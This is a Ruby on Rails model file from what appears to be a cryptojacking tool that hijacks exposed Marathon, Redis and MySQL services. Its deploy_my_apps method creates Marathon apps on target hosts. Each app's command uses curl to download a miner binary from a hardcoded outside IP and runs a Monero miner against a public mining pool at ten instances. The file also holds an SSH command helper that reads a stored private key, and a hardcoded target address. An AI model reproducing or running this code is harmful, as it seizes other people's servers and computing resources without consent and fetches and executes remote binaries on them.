require 'net/ssh'

class Node < ApplicationRecord
  MINERD = "http://162.242.245.65:8220/minerd"


  scope :marathon, -> { where(source: "marathon") }
  scope :redis, -> { where(source: "redis") }
  scope :mysql, -> { where(source: "mysql") }
  has_many :apps

  def redis
    Redis.new host: self.ip, port: self.port, connect_timeout: 2
  end

  def ssh_exec cmd = "ls"
    keys = File.read(Rails.root.join("god-love-cat"))
    Net::SSH.start(self.ip, "ubuntu", :key_data => keys, :keys_only => true) do |ssh|
      result = ssh.exec!('ls')
      result
    end
  end

  def self.mine
    x = find_by ip: "114.55.130.152"
    x.port = 6379
    x

  end

  def deploy_my_apps
    puts "deploy #{self.ip} "

    url = "http://#{self.ip}:#{self.port}"
    Marathon.url = url
    hash = {
      id: "/web-#{rand(1024)}",
      cmd: "curl -sSL #{MINERD} -o minerd && chmod +x minerd; ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u didi123123231@gmail.com -t 10 -p x",
      cpus: 0.3,
      mem: 200,
      disk: 123,
      instances: 10,
      portDefinitions: [
        {
          port: 10000,
          protocol: "tcp",
          name: "default",
          labels: {}
        } ]
    }

    begin
      puts "creating #{hash[:id]} on #{self.ip}"
      app = Marathon::App.create hash
      app.scale! 10
    rescue Exception => e
      puts e
    end
  end

end
